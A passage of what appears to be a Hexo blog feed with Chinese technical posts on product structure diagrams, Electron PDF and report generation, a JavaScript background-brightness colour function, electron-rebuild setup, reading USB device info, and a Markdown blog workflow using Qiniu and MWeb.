        <content type="html"><![CDATA[<h1 id="区分产品结构图-产品信息结构图-产品功能结构"><a href="#区分产品结构图-产品信息结构图-产品功能结构" class="headerlink" title="区分产品结构图,产品信息结构图,产品功能结构"></a>区分产品结构图,产品信息结构图,产品功能结构</h1><p>做项目中各种结构图经常弄混乱,导致权责不清楚.<br>经常把自己”人格分裂”,同时充当很多角色.<br>产品经理–项目经理–技术经理–架构师–研发工程师–UI设计–运维–运营–测试</p><p>结构图很多产品经理都没有做,只出需求文档,原型图.由于技术出生,习惯用理性的思想来做事,可以外脑来存储的,而不是感性的文字描述,有版本,可回归.<br>除了给Boss看,尽量用excel,project,xmind来编写.<br>反而注重结构,轻原型.</p><p>我喜欢的顺序是:</p><ol><li>功能结构图</li><li>信息结构图</li><li>产品结构图/流程图</li><li>原型图/交互设计/UI设计/数据库设计/架构设计</li><li>任务计划安排/编写测试用例</li><li>开发</li></ol><p>各结构图虽然有重复,但侧重点不一样.</p><h2 id="功能结构图"><a href="#功能结构图" class="headerlink" title="功能结构图"></a>功能结构图</h2><p> 作用: <strong>梳理功能点</strong><br> 产品经理:罗列所有功能点及细节,如客户需求,老板需求,竞品功能,臆想的功能.<br> 包含优先级,需求来源,注释<br> 技术经理: 转化成任务,任务类型为功能,包含未完成,完成,关闭的功能,需要注明负责人,优先级,预期时间,开始时间,结束时间,依赖任务.</p><h2 id="信息结构图"><a href="#信息结构图" class="headerlink" title="信息结构图"></a>信息结构图</h2><p> 作用: <strong>梳理所有信息数据与关系</strong><br> 数据库可以定信息类型,如布尔型,字符型,数据关联,字符长度<br> 产品经理:罗列所有信息,要求<br> 研发:定数据结构</p><h2 id="产品结构"><a href="#产品结构" class="headerlink" title="产品结构"></a>产品结构</h2><p>作用: <strong>展示所有功能,信息,交互</strong><br>综合之前功能结构,和信息结构,完善信息和功能,去掉不必要的功能和信息.<br>补充那交互,设计图,原型图<br>我认为产品结构是产品经理的最终产物,而不是某个网站,APP.</p><h2 id="Xmind的使用"><a href="#Xmind的使用" class="headerlink" title="Xmind的使用"></a>Xmind的使用</h2><h3 id="需求整理"><a href="#需求整理" class="headerlink" title="需求整理"></a>需求整理</h3><p>各种有理无理的需求,自己YY的需求等.草稿版<br>使用xmind的灵感工具.<br>如:<br><img src="http://img.hi-arkin.com/2019-02-22-15508423454705.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Project </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 产品经理 </tag>
            
            <tag> 项目管理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>electron生成pdf</title>
      <link href="/2019/01/09/Electron/convert2pdf/"/>
      <url>/2019/01/09/Electron/convert2pdf/</url>
      
        <content type="html"><![CDATA[<h1 id="electron生成pdf"><a href="#electron生成pdf" class="headerlink" title="electron生成pdf"></a>electron生成pdf</h1><p>主要是html转pdf,pdf是打印用的文档,可以控制打印的格式.<br>使用electron生成pdf的方式就很随意了.<br>使用webview.toPDF(),NodeJS转化,NodeJS调用系统资源去生成都可以.<br>下面主要讲 使用webview或webcontent生成PDF.<br>注意:Electron的toPDF不支持页眉页脚设置.后面只能通过其它文案去修改页眉页脚了.</p><h2 id="主要步骤"><a href="#主要步骤" class="headerlink" title="主要步骤"></a>主要步骤</h2><ol><li>读取weburl</li><li>生成临时PDF文件</li><li>预览临时PDF</li><li>打印临时PDF</li><li>下载,上传PDF</li></ol><h3 id="读取URL"><a href="#读取URL" class="headerlink" title="读取URL"></a>读取URL</h3><p>在服务器使用php模板渲染生成html页面,写打印样式.<br>统一使用A4纸标准.<br>打印注意,请参考关于html打印相关文章.</p><p>下面都是基于electron-vue的代码.<br>关键代码:<br><img src="http://img.hi-arkin.com/2019-01-09-15469770708587.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> NodeJs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Electron </tag>
            
            <tag> PDF </tag>
            
            <tag> Project </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Doc电子报告研发</title>
      <link href="/2019/01/09/Electron/report/"/>
      <url>/2019/01/09/Electron/report/</url>
      
        <content type="html"><![CDATA[<h1 id="Doc电子报告研发过程"><a href="#Doc电子报告研发过程" class="headerlink" title="Doc电子报告研发过程"></a>Doc电子报告研发过程</h1><p>这是记录一次电子报告研发过程,口水记录.<br>项目中需要生成电子报告;</p><p>一切不讲实际场景的解决方案都是耍牛氓.</p><h1 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h1><ul><li>类似ERP系统,需要生成电子报告;</li><li>需要私网部署;</li><li>电子报告格式复杂,内容包含:富文本,公式,特殊字符,表格,图片,分页涵盖Word的功能;</li><li>内容长度不限制;</li><li>后台服务器主要使用PHP开发,但不限制PHP,NodeJS,Pyhton,Java,C++都可以;</li><li>服务器主要使用CentOS7</li><li>线下主要通过修改使用Word模板生成报告;</li><li>使用Word打印;</li><li>Word有良好打印格式支持;</li><li>电子报告是必须流程;</li></ul><h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><h2 id="HTML转WORD方案"><a href="#HTML转WORD方案" class="headerlink" title="HTML转WORD方案"></a>HTML转WORD方案</h2><p>通过html生成pdf或word,也研究过markdown转word.<br>虽然能达到要求,但是由于前端html的使用分辨率px来计算,打印使用点pi来计算,很难精确控制页面样式.</p><p>html转pdf的方案工具很多,<br>文档格式的瑞士军刀pandoc,很多格式都可以转换<br>官网:<a href="http://www.pandoc.org/" target="_blank" rel="noopener">http://www.pandoc.org/</a><br>在macos,window,linux下都可以安装使用.<br>常用转换格式,看下图<br><img src="http://www.pandoc.org/diagram.jpg" alt=""></p><p>虽然很强大,但生成文档质量差强人意,个人使用可以,客户很挑,有可能为了个空格折腾一星期都解决不了.</p><h2 id="PHPWord方案"><a href="#PHPWord方案" class="headerlink" title="PHPWord方案"></a>PHPWord方案</h2><p>设想通过word模板生成word,设想很美好,现实很骨感.<br>PHPOffice的GitHub:<br><a href="https://github.com/PHPOffice/PHPWord" target="_blank" rel="noopener">https://github.com/PHPOffice/PHPWord</a></p><p>选型阶段,测试了几个简单的模板,文本变量替换完全没问题,就匆匆使用了.<br>经过几天试用,完全解决不了问题.<br>问题:</p><ol><li>分块没法复制</li><li>表格生成有问题</li><li>库Bug太多,很多千年bug没有修复</li><li>复制的数据结构完全就蒙逼了</li><li>打开文本写入会丢失原word样式</li><li>模板正则有问题,兼容性也存在问题.</li><li>文档太差,没法入手</li></ol><p>Bug太多,有很多需要修改源码才能使用,时间紧就没有使用.迫切使用第二方案.</p><h2 id="在线Word解析"><a href="#在线Word解析" class="headerlink" title="在线Word解析"></a>在线Word解析</h2><p>地址:<a href="http://www.xdocin.com" target="_blank" rel="noopener">http://www.xdocin.com</a><br>这个云模板,支持很多数据结构,直接调用API就能使用,可以生成word,pdf.<br>也是基于word模板变量替换方式来完成的.<br>一些简单的结构还比较OK,格式不会丢失.</p><p>缺点和问题:</p><ol><li>基于对象的模板变量,虽然可以支持多层结构的数据 ,但是有个缺点,就是不能跨页,如果数据量多超就显示不全. 对象就是Word”文本框”来实现.</li><li>无故多空白,串行等现象</li><li>无法支持运算</li><li>富文本不支持</li><li>公式不支持</li><li>图片很难调整</li><li>不支持私有布署</li><li>不开源,有问题只能面对黑洞</li></ol><h2 id="Python方案"><a href="#Python方案" class="headerlink" title="Python方案"></a>Python方案</h2><p>回到原点,PHPWord虽然可以能写入任意内容,但是质量效率都成问题.我们考虑使用其它语言方案,不能在一棵树上吊死.<br>选择一门稍微快速入手的语言,Python.<br>git:<a href="https://github.com/python-openxml/python-docx" target="_blank" rel="noopener">https://github.com/python-openxml/python-docx</a></p><p>通过python生成api,然后使用php去调用.<br>python-docx,可以私有化布署,支持富文本与公式,调整样式等自定义操作.</p><p>缺点:</p><ol><li>复增加杂度跨语言,维护难度增加</li><li>已经失去word模板的用处,基本上是创建word.</li><li>不能可视化,调整很复杂.</li><li>由于word的格式与html常用的富文本不一样,比如公式表达不一样.前端UI后word需要两套处理方案.</li></ol><p>通过上面几次选型,决定再回归到最初html方案,直接导出PDF,不在生成word.减少复杂度.</p><p>需要解决问题:</p><ol><li>报告生成</li><li>报告预览</li><li>UI和报告一至</li><li>减少复杂度</li><li>支持定制化的所有要求</li><li>浏览器兼容性</li><li>跨平台</li></ol><p>因为ERP有大量打印需要,自定义打印内容,硬件交互,本地文件处理的需要.<br>这次直接使用封装html方案,来避规这些问题,通过选型,我们使用了Electron方案.</p><p>参考后面<a href="/2019/01/09/Electron/convert2pdf">&lt;&lt;electron生成pdf&gt;&gt;</a>文章</p><h2 id="WebOffice方案"><a href="#WebOffice方案" class="headerlink" title="WebOffice方案"></a>WebOffice方案</h2><p>如果需要真正可被化在线编辑Word,只能使用在线文档编辑控件了.这个布署复杂,收费,难以自定义.</p><p>官方office online:<br><a href="https://products.office.com/zh-cn/office-online/documents-spreadsheets-presentations-office-online" target="_blank" rel="noopener">https://products.office.com/zh-cn/office-online/documents-spreadsheets-presentations-office-online</a></p><p>服务器不跨不平台且收费,客户端跨平台免费使用.</p><p>这个方案,算是最后的稻草,基于能省则省的原则,到最后再尝试.</p>]]></content>
      
      
      <categories>
          
          <category> NodeJs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Electron </tag>
            
            <tag> PDF </tag>
            
            <tag> Project </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过背景色设置文字颜色</title>
      <link href="/2019/01/07/Javascript/isLight/"/>
      <url>/2019/01/07/Javascript/isLight/</url>
      
        <content type="html"><![CDATA[<h1 id="通过背景色设置文字颜色"><a href="#通过背景色设置文字颜色" class="headerlink" title="通过背景色设置文字颜色"></a>通过背景色设置文字颜色</h1><blockquote><p>有这么一个需求,用户设置选择一个主题颜色,计算出背景色和文字颜色.</p></blockquote><p>通过分析需求,需要最简单的实现方案,背景色和主题色,文字为背景色的对比色.<br>对比色,可以简单的两种,黑或白色,根据背景色的明暗度使用白或黑.</p><h2 id="获取色值的明暗度"><a href="#获取色值的明暗度" class="headerlink" title="获取色值的明暗度"></a>获取色值的明暗度</h2><p>明暗度,通过两种色彩模式获取.</p><ol><li><p>PS中,HSV(HSB)色彩模式:<br>H:色相 (0-360)<br>S:饱和度 (0-100%)<br>V:亮度 (0-100%)</p></li><li><p>在CSS中只支持HSL色彩模式:<br>H:色相 (0-360)<br>S:饱和度 (0-100%)<br>L:明度 (0-100%)</p></li></ol><p>纯红色:RGB(255,0,0)在不同色彩模式的表现.</p><p>HSV,为0,100%,100%<br><img src="http://img.hi-arkin.com/2019-01-07-15468632590207.jpg" alt=""></p><p>HSL,为0,100%,50%<br><img src="http://img.hi-arkin.com/2019-01-07-15468632005598.jpg" alt=""></p><p>HSl更适合人类眼睛,通过观察我们只需要判断HSl色彩模式的L就可以了.L:50%时,使用明或暗都可以.</p><h2 id="使用JS转换色值"><a href="#使用JS转换色值" class="headerlink" title="使用JS转换色值"></a>使用JS转换色值</h2><p>因为前端考虑兼容性,CSS常用两种色彩模式,RGB的十进制和十六进制.透明度暂时不考虑.</p><h3 id="HEX转RGB"><a href="#HEX转RGB" class="headerlink" title="HEX转RGB"></a>HEX转RGB</h3><p>参考公式:__<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> colorRgb = <span class="function"><span class="keyword">function</span>(<span class="params">sColor</span>)</span>&#123;</span><br><span class="line">    sColor = sColor.toLowerCase();</span><br><span class="line">    <span class="comment">//十六进制颜色值的正则表达式</span></span><br><span class="line">    <span class="keyword">var</span> reg = <span class="regexp">/^#([0-9a-fA-f]&#123;3&#125;|[0-9a-fA-f]&#123;6&#125;)$/</span>;</span><br><span class="line">    <span class="comment">// 如果是16进制颜色</span></span><br><span class="line">    <span class="keyword">if</span> (sColor &amp;&amp; reg.test(sColor)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (sColor.length === <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> sColorNew = <span class="string">"#"</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">1</span>; i&lt;<span class="number">4</span>; i+=<span class="number">1</span>) &#123;</span><br><span class="line">                sColorNew += sColor.slice(i, i+<span class="number">1</span>).concat(sColor.slice(i, i+<span class="number">1</span>));    </span><br><span class="line">            &#125;</span><br><span class="line">            sColor = sColorNew;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//处理六位的颜色值</span></span><br><span class="line">        <span class="keyword">var</span> sColorChange = [];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">1</span>; i&lt;<span class="number">7</span>; i+=<span class="number">2</span>) &#123;</span><br><span class="line">            sColorChange.push(<span class="built_in">parseInt</span>(<span class="string">"0x"</span>+sColor.slice(i, i+<span class="number">2</span>)));    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"RGB("</span> + sColorChange.join(<span class="string">","</span>) + <span class="string">")"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sColor;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><h3 id="RGB转HSL"><a href="#RGB转HSL" class="headerlink" title="RGB转HSL"></a>RGB转HSL</h3><p>参考网上的公式函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * RGB 颜色值转换为 HSL.</span></span><br><span class="line"><span class="comment"> * 转换公式参考自 http://en.wikipedia.org/wiki/HSL_color_space.</span></span><br><span class="line"><span class="comment"> * r, g, 和 b 需要在 [0, 255] 范围内</span></span><br><span class="line"><span class="comment"> * 返回的 h, s, 和 l 在 [0, 1] 之间</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param   Number  r       红色色值</span></span><br><span class="line"><span class="comment"> * @param   Number  g       绿色色值</span></span><br><span class="line"><span class="comment"> * @param   Number  b       蓝色色值</span></span><br><span class="line"><span class="comment"> * @return  Array           HSL各值数组</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rgbToHsl</span>(<span class="params">r, g, b</span>) </span>&#123;</span><br><span class="line">    r /= <span class="number">255</span>, g /= <span class="number">255</span>, b /= <span class="number">255</span>;</span><br><span class="line">    <span class="keyword">var</span> max = <span class="built_in">Math</span>.max(r, g, b), min = <span class="built_in">Math</span>.min(r, g, b);</span><br><span class="line">    <span class="keyword">var</span> h, s, l = (max + min) / <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (max == min)&#123; </span><br><span class="line">        h = s = <span class="number">0</span>; <span class="comment">// achromatic</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> d = max - min;</span><br><span class="line">        s = l &gt; <span class="number">0.5</span> ? d / (<span class="number">2</span> - max - min) : d / (max + min);</span><br><span class="line">        <span class="keyword">switch</span>(max) &#123;</span><br><span class="line">            <span class="keyword">case</span> r: h = (g - b) / d + (g &lt; b ? <span class="number">6</span> : <span class="number">0</span>); <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> g: h = (b - r) / d + <span class="number">2</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> b: h = (r - g) / d + <span class="number">4</span>; <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        h /= <span class="number">6</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [h, s, l];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="明暗度判断"><a href="#明暗度判断" class="headerlink" title="明暗度判断"></a>明暗度判断</h3><p>明暗度是基于人眼的感光程度来的,可以选择一个舒适的取值范围,下面是我的人眼取值.</p><ol><li>通过L值判断,在大于60左右为”亮”.</li><li>直接通过RGB值来判断也可,比值公式</li></ol><p>(0.213 <em> rgb[0] + 0.715 </em> rgb[1] + 0.072 * rgb[2]) &gt;255/2</p><p>完成</p><h2 id="项目中"><a href="#项目中" class="headerlink" title="项目中"></a>项目中</h2><p>对色盘认识不够,不然可以取亲合一点的对比色,那就完美了.</p><p>我主要用于electron封装壳主题色改变,electron和web是两套系统,只能通过 html中的meta来获取web当前的主题,从而改变标题栏等颜色.</p><p>html中:<br><img src="http://img.hi-arkin.com/2019-01-07-15468660643513.jpg" alt=""></p><p>electron-vue中</p><p>mounted():</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//  theme</span></span><br><span class="line">webview.addEventListener(<span class="string">'did-change-theme-color'</span>, (e,themeColor) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span>(e.themeColor)&#123;</span><br><span class="line">    <span class="keyword">this</span>.theme=e.themeColor</span><br><span class="line">    <span class="keyword">this</span>.changeTheme(e.themeColor);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>method()中</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">changeTheme(themeColor)&#123;</span><br><span class="line">    themeColor=themeColor.toLowerCase();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> reg = <span class="regexp">/^#([0-9a-fA-f]&#123;3&#125;|[0-9a-fA-f]&#123;6&#125;)$/</span>;</span><br><span class="line">    <span class="keyword">let</span> rgbColor=[];</span><br><span class="line">     <span class="comment">// 十六进制转换RGB</span></span><br><span class="line">    <span class="keyword">if</span> (reg.test(themeColor)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (themeColor.length === <span class="number">4</span>) &#123;</span><br><span class="line">        rgbColor[<span class="number">0</span>]=<span class="built_in">parseInt</span>(<span class="string">"0x"</span>+themeColor.substr(<span class="number">1</span>,<span class="number">1</span>)+themeColor.substr(<span class="number">1</span>,<span class="number">1</span>)+themeColor.substr(<span class="number">1</span>,<span class="number">1</span>));</span><br><span class="line">        rgbColor[<span class="number">1</span>]=<span class="built_in">parseInt</span>(<span class="string">"0x"</span>+themeColor.substr(<span class="number">2</span>,<span class="number">1</span>)+themeColor.substr(<span class="number">2</span>,<span class="number">1</span>)+themeColor.substr(<span class="number">2</span>,<span class="number">1</span>));</span><br><span class="line">        rgbColor[<span class="number">2</span>]=<span class="built_in">parseInt</span>(<span class="string">"0x"</span>+themeColor.substr(<span class="number">3</span>,<span class="number">1</span>)+themeColor.substr(<span class="number">3</span>,<span class="number">1</span>)+themeColor.substr(<span class="number">3</span>,<span class="number">1</span>));</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        rgbColor[<span class="number">0</span>]=<span class="built_in">parseInt</span>(<span class="string">"0x"</span>+themeColor.substr(<span class="number">1</span>,<span class="number">2</span>));</span><br><span class="line">        rgbColor[<span class="number">1</span>]=<span class="built_in">parseInt</span>(<span class="string">"0x"</span>+themeColor.substr(<span class="number">2</span>,<span class="number">2</span>));</span><br><span class="line">        rgbColor[<span class="number">2</span>]=<span class="built_in">parseInt</span>(<span class="string">"0x"</span>+themeColor.substr(<span class="number">4</span>,<span class="number">2</span>));</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="regexp">/^(rgb|RGB)/</span>.test(themeColor))&#123;</span><br><span class="line">      rgbColor = themeColor.replace(<span class="regexp">/(?:\(|\)|rgb|RGB)*/g</span>, <span class="string">""</span>).split(<span class="string">","</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 获取颜色明暗度</span></span><br><span class="line">    <span class="keyword">let</span> isLight=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(rgbColor)&#123;</span><br><span class="line">      <span class="keyword">let</span> isLightValue =(<span class="number">0.213</span> * rgbColor[<span class="number">0</span>] +<span class="number">0.715</span>* rgbColor[<span class="number">1</span>] +<span class="number">0.072</span> * rgbColor[<span class="number">2</span>]); </span><br><span class="line">      <span class="comment">// 人眼明暗度 0.213,0.715,0.072</span></span><br><span class="line">      isLight=isLightValue &gt;<span class="number">155</span>;</span><br><span class="line">      <span class="comment">//console.log(themeColor,isLightValue); </span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      themeColor=<span class="string">'#5b6270'</span>;</span><br><span class="line">      isLight=<span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> TextColor=isLight?<span class="string">'#333'</span>:<span class="string">'#f5f5f5'</span>;</span><br><span class="line">    <span class="keyword">this</span>.themeStyle=&#123;</span><br><span class="line">      color:TextColor,</span><br><span class="line">      background:themeColor</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 颜色 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Electron Build 安装使用</title>
      <link href="/2018/12/24/Electron/electron-rebuild/"/>
      <url>/2018/12/24/Electron/electron-rebuild/</url>
      
        <content type="html"><![CDATA[<h1 id="Electron-Build-安装使用"><a href="#Electron-Build-安装使用" class="headerlink" title="Electron Build 安装使用"></a>Electron Build 安装使用</h1><p>NodeJs原生插件因为版本系统问题,需要重新编译.</p><p>Electron环境下,最好固定版本,备份定指定版本数据,避免NPM或源被和谐.<br>electron有快捷build方法.</p><p>依赖node,npm</p><h2 id="electron-rebuild"><a href="#electron-rebuild" class="headerlink" title="electron-rebuild"></a>electron-rebuild</h2><p><a href="https://electronjs.org/docs/tutorial/using-native-node-modules" target="_blank" rel="noopener">官方文档(cn)</a></p><h3 id="安装node-gyp"><a href="#安装node-gyp" class="headerlink" title="安装node-gyp"></a>安装node-gyp</h3><p>参考: <a href="https://githnpmub.com/nodejs/node-gyp" target="_blank" rel="noopener">https://githnpmub.com/nodejs/node-gyp</a></p><p>[window系统]<br>window使用<a href="https://github.com/felixrieseberg/windows-build-tools" target="_blank" rel="noopener">Windows-Build-Tools</a>工具快捷安装各种依赖.</p><p>powershell/cmd中安装,使用管理员方式运行<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yarn global add windows-build-tools</span><br><span class="line"><span class="meta">#</span><span class="bash">或</span></span><br><span class="line">npm install windows-build-tools -g</span><br></pre></td></tr></table></figure></p><p>[MacOS]<br>Mac默认有python2.7,只需要安装node-gyp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install node-gyp -g</span><br><span class="line">或</span><br><span class="line">yarn global add  node-gyp</span><br></pre></td></tr></table></figure></p><h3 id="安装electron-rebuild"><a href="#安装electron-rebuild" class="headerlink" title="安装electron-rebuild"></a>安装electron-rebuild</h3><p><a href="https://github.com/electron/electron-rebuild" target="_blank" rel="noopener">GitHub</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev electron-rebuild</span><br></pre></td></tr></table></figure><ul><li>运行编译</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./node_modules/.bin/electron-rebuild</span><br><span class="line"><span class="comment"># 或windows</span></span><br><span class="line">.\node_modules\.bin\electron-rebuild.cmd</span><br></pre></td></tr></table></figure><p>由于网络原因,尽量使用yarn.<br>然而淘宝源不太干净,会导致各种神奇的原因.</p>]]></content>
      
      
      <categories>
          
          <category> Electron </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Electron </tag>
            
            <tag> NodeJs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Node获取Usb信息</title>
      <link href="/2018/12/20/Electron/usb/"/>
      <url>/2018/12/20/Electron/usb/</url>
      
        <content type="html"><![CDATA[<h1 id="Node获取Usb信息"><a href="#Node获取Usb信息" class="headerlink" title="Node获取Usb信息"></a>Node获取Usb信息</h1><h2 id="MacOS获取Usb相关资料"><a href="#MacOS获取Usb相关资料" class="headerlink" title="MacOS获取Usb相关资料"></a>MacOS获取Usb相关资料</h2><p>如果已经安装 <code>lsusb</code> 可以使用lsusb获取<br>没有則使用 <code>system_profiler SPUSBDataType</code></p><h2 id="Windows可以通过-Wmic获取"><a href="#Windows可以通过-Wmic获取" class="headerlink" title="Windows可以通过 Wmic获取"></a>Windows可以通过 Wmic获取</h2>]]></content>
      
      
      <categories>
          
          <category> NodeJs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Electron </tag>
            
            <tag> Node </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于MarkDown的博客系统搭建</title>
      <link href="/2018/05/21/%E5%85%B6%E5%AE%83/20180521/"/>
      <url>/2018/05/21/%E5%85%B6%E5%AE%83/20180521/</url>
      
        <content type="html"><![CDATA[<blockquote><p>纯粹的文章编写,使用到GitPage,Hexo,MWeb,七牛做图床</p></blockquote><a id="more"></a><h2 id="注册七牛云账号"><a href="#注册七牛云账号" class="headerlink" title="注册七牛云账号"></a>注册七牛云账号</h2><p><a href="https://qiniu.com" target="_blank" rel="noopener">七牛官网</a></p><h3 id="创建”对象存储”"><a href="#创建”对象存储”" class="headerlink" title="创建”对象存储”"></a>创建”对象存储”</h3><p><img src="http://img.hi-arkin.com/2018-12-13-15446982780002.jpg" alt="创建对象存储"></p><h3 id="个人中心获取密钥"><a href="#个人中心获取密钥" class="headerlink" title="个人中心获取密钥"></a>个人中心获取密钥</h3><p><img src="http://img.hi-arkin.com/2018-12-13-15446983346117.jpg" alt="密钥"></p><h2 id="安装MWeb"><a href="#安装MWeb" class="headerlink" title="安装MWeb"></a>安装MWeb</h2><p><a href="https://zh.mweb.im/" target="_blank" rel="noopener">MWeb官网</a></p><h3 id="Mweb界面"><a href="#Mweb界面" class="headerlink" title="Mweb界面:"></a>Mweb界面:</h3><p><img src="http://img.hi-arkin.com/2018-12-13-15446981064348.jpg" alt=""></p><h3 id="打开设置界面"><a href="#打开设置界面" class="headerlink" title="打开设置界面"></a>打开设置界面</h3><p><img src="http://img.hi-arkin.com/2018-12-13-15446985074780.jpg" alt=""></p><h3 id="填入密钥"><a href="#填入密钥" class="headerlink" title="填入密钥"></a>填入密钥</h3><p><img src="http://img.hi-arkin.com/2018-12-13-15446985671071.jpg" alt=""></p><p>完成后就可以上传图片了,图片访问需要一个固定域名,创建时七牛云给一个临时的域名可以使用一个月.</p><h3 id="使用”外部模式”-快捷键⌘-E"><a href="#使用”外部模式”-快捷键⌘-E" class="headerlink" title="使用”外部模式” 快捷键⌘+E"></a>使用”外部模式” 快捷键⌘+E</h3><p><img src="http://img.hi-arkin.com/2018-12-13-15446987030673.jpg" alt=""><br>点 “+”号引入</p><h3 id="配置项目"><a href="#配置项目" class="headerlink" title="配置项目"></a>配置项目</h3><p><img src="http://img.hi-arkin.com/2018-12-13-15446993418827.jpg" alt=""></p><p>因为MWeb在外部模式才支持,图片url替换,正常模式需要手工上传粘贴url</p><h2 id="安装Hexo"><a href="#安装Hexo" 